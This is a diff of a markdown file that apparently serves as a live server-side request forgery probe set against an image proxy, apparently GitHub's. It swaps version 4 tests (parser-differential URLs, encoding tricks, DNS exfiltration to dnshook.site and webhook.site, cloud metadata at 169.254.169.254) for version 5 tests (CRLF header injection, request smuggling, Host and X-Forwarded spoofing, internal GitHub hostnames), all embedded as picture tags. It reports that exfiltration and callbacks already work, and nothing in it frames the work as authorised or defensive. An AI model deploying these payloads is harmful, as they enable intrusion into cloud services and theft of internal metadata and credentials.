@@ -1,129 +1,112 @@
-# SSRF Testing v4 - Parser Differentials & Redirect Chains
+# SSRF v5 - CRLF Injection & Host Header Exploitation
 
-## Confirmed Findings
-- DNS exfiltration via subdomains WORKS
-- External HTTP callbacks WORK
-- All direct internal IP access BLOCKED
+## Key Finding: CRLF characters pass through!
+This suggests potential for header/request injection attacks.
 
-## Test 1: Redirect to Internal via External
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/redirect-test" media="(min-width: 1px)"><img src="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/tracker"></picture>
+## Test 1: Double CRLF - New Request
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/double-crlf%0d%0a%0d%0aGET%20/secret%20HTTP/1.1%0d%0aHost:%20169.254.169.254" media="(min-width: 1px)"><img src="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/tracker"></picture>
 
-## Test 2: Fragment Bypass
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca#@169.254.169.254/latest/meta-data" media="(min-width: 1px)"><img src="x"></picture>
+## Test 2: Host Header Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/host%0d%0aHost:%20localhost" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 3: URL with Credentials Bypass  
-<picture><source srcset="https://169.254.169.254:80@webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/creds-bypass" media="(min-width: 1px)"><img src="x"></picture>
+## Test 3: X-Forwarded-For Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/xff%0d%0aX-Forwarded-For:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 4: Reversed Credentials
-<picture><source srcset="https://webhook.site@169.254.169.254/latest/meta-data/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 4: X-Real-IP Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/realip%0d%0aX-Real-IP:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 5: URL Parser Confusion - Backslash
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca\\@169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>
+## Test 5: X-Forwarded-Host Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/fhost%0d%0aX-Forwarded-Host:%20169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 6: Unicode Domain Confusables
-<picture><source srcset="https://ⓦⓔⓑⓗⓞⓞⓚ.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/unicode" media="(min-width: 1px)"><img src="x"></picture>
+## Test 6: X-Original-URL Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/xoriginal%0d%0aX-Original-URL:%20http://169.254.169.254/latest" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 7: Full-width Characters
-<picture><source srcset="https://ｗｅｂｈｏｏｋ.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/fullwidth" media="(min-width: 1px)"><img src="x"></picture>
+## Test 7: X-Rewrite-URL Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/xrewrite%0d%0aX-Rewrite-URL:%20/admin" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 8: CRLF Injection in URL
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/crlf%0d%0aHost:%20169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>
+## Test 8: Connection Close Smuggling
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/conn%0d%0aConnection:%20close" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 9: Tab Character Bypass
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/tab%09test" media="(min-width: 1px)"><img src="x"></picture>
+## Test 9: Content-Length Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/cl%0d%0aContent-Length:%200" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 10: DNS Exfil with More Data
-<picture><source srcset="https://aws-metadata-169-254-169-254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/dns-exfil" media="(min-width: 1px)"><img src="x"></picture>
+## Test 10: Transfer-Encoding Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/te%0d%0aTransfer-Encoding:%20chunked" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 11: DNS Exfil - Encoded Payload
-<picture><source srcset="https://aW50ZXJuYWwtc2VjcmV0.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/b64" media="(min-width: 1px)"><img src="x"></picture>
+## Test 11: AWS Metadata Header
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/aws%0d%0aX-aws-ec2-metadata-token:%20test" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 12: Numeric Domain (IP as Decimal)
-<picture><source srcset="https://2852039166.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/decimal-ip" media="(min-width: 1px)"><img src="x"></picture>
+## Test 12: GCP Metadata Header
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/gcp%0d%0aMetadata-Flavor:%20Google" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 13: Short Domain Redirect Service
-<picture><source srcset="https://tinyurl.com/y3j2k4l5" media="(min-width: 1px)"><img src="x"></picture>
+## Test 13: Cookie Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/cookie%0d%0aCookie:%20admin=true" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 14: Bit.ly Redirect
-<picture><source srcset="https://bit.ly/3xYz123" media="(min-width: 1px)"><img src="x"></picture>
+## Test 14: Authorization Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/auth%0d%0aAuthorization:%20Bearer%20token" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 15: Double URL Encoding
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/%252e%252e%252f%252e%252e%252f" media="(min-width: 1px)"><img src="x"></picture>
+## Test 15: Referer Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/referer%0d%0aReferer:%20http://internal.github.com" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 16: Mixed Encoding
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/%2e%2e/%252e%252e/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 16: Origin Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/origin%0d%0aOrigin:%20http://localhost" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 17: URL with Port 80 Explicit
-<picture><source srcset="https://webhook.site:443/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/port443" media="(min-width: 1px)"><img src="x"></picture>
+## Test 17: LF Only Injection (Linux style)
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/lf%0aHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 18: URL with Non-standard Port
-<picture><source srcset="https://webhook.site:8443/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/port8443" media="(min-width: 1px)"><img src="x"></picture>
+## Test 18: CR Only Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/cr%0dHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 19: IPv4-mapped IPv6 to Webhook
-<picture><source srcset="https://[::ffff:185.194.77.104]/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/ipv6mapped" media="(min-width: 1px)"><img src="x"></picture>
+## Test 19: Unicode Line Separator
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/unicode%E2%80%A8Host:%20internal" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 20: Path Confusion
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/../../../etc/passwd" media="(min-width: 1px)"><img src="x"></picture>
+## Test 20: Unicode Paragraph Separator
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/para%E2%80%A9Host:%20internal" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 21: Semicolon Path
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/;id=1" media="(min-width: 1px)"><img src="x"></picture>
+## Test 21: Null Byte Termination
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/null%00internal" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 22: Question Mark Confusion
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4?evil=http://169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>
+## Test 22: Request Smuggling CL.TE
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/clte%0d%0aContent-Length:%2050%0d%0aTransfer-Encoding:%20chunked" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 23: Hash Before Domain
-<picture><source srcset="https://evil.com#https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/hash" media="(min-width: 1px)"><img src="x"></picture>
+## Test 23: Request Smuggling TE.CL
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/tecl%0d%0aTransfer-Encoding:%20chunked%0d%0aContent-Length:%2050" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 24: IPv6 Localhost with Scope
-<picture><source srcset="https://[::1%25eth0]:80/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 24: Absolute URL in Path
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%0d%0aGET%20http://169.254.169.254/%20HTTP/1.1" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 25: 0.0.0.0 Binding
-<picture><source srcset="https://0.0.0.0/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 25: Method Override Header
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/method%0d%0aX-HTTP-Method-Override:%20PUT" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 26: Spoofed Extension
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/image.png" media="(min-width: 1px)"><img src="x"></picture>
+## Test 26: DNS Canary - Webhook Subdomain
+<picture><source srcset="https://callback-v5.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v5/dns-canary" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 27: Multiple Question Marks
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4?a=1?b=2?c=3" media="(min-width: 1px)"><img src="x"></picture>
+## Test 27: Encoded CRLF Double
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%250d%250a%250d%250ainjected" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 28: Newline in Path
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/test%0aevil" media="(min-width: 1px)"><img src="x"></picture>
+## Test 28: Mixed Encoding CRLF
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%0d%250aHost:%20evil" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 29: Carriage Return
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/test%0devil" media="(min-width: 1px)"><img src="x"></picture>
+## Test 29: Triple Encoded CRLF
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%25250d%25250aHeader" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 30: AWS via DNS with Instance-ID Exfil
-<picture><source srcset="https://instance-id-exfil.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4" media="(min-width: 1px)"><img src="x"></picture>
+## Test 30: GitHub Internal Service Names
+<picture><source srcset="https://api.github.localhost.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 31: GCP Metadata Alt Header
-<picture><source srcset="https://metadata.google.internal/computeMetadata/v1/project/project-id" media="(min-width: 1px)"><img src="x"></picture>
+## Test 31: Camo Self-Reference
+<picture><source srcset="https://camo.githubusercontent.com.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 32: Kubernetes via DNS
-<picture><source srcset="https://kubernetes-apiserver.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 32: GitHub Actions Runner
+<picture><source srcset="https://actions-runner.github.internal.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 33: Generic Internal DNS
-<picture><source srcset="https://internal.github.com.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 33: Set-Cookie via CRLF
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/setcookie%0d%0aSet-Cookie:%20admin=1" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 34: Host Header via Subdomain
-<picture><source srcset="https://webhook.site.169.254.169.254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 34: Location Header Injection
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/location%0d%0aLocation:%20http://169.254.169.254/" media="(min-width: 1px)"><img src="x"></picture>
 
-## Test 35: Well-known Port
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/.well-known/acme-challenge/test" media="(min-width: 1px)"><img src="x"></picture>
-
-## Test 36: SSRF Canary
-<picture><source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.oastify.com" media="(min-width: 1px)"><img src="x"></picture>
-
-## Test 37: Collaborator Alternative
-<picture><source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.burpcollaborator.net" media="(min-width: 1px)"><img src="x"></picture>
-
-## Test 38: DNS to Decimal IP Subdomain
-<picture><source srcset="https://169.254.169.254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
-
-## Test 39: GitHub Raw Content Redirect
-<picture><source srcset="https://raw.githubusercontent.com/jessi2000/progsjessi/main/redirect.txt" media="(min-width: 1px)"><img src="x"></picture>
-
-## Test 40: GitHub Pages Redirect
-<picture><source srcset="https://jessi2000.github.io/progsjessi/" media="(min-width: 1px)"><img src="x"></picture>
+## Test 35: HTTP/2 Smuggling Headers
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/h2%0d%0a:path:%20/secret%0d%0a:authority:%20internal" media="(min-width: 1px)"><img src="x"></picture>
 
 ---
-**Commit:** v4 - Parser differentials, credentials, encoding tricks, DNS exfil expansion
+**v5: CRLF Injection Focus - Testing header injection possibilities**
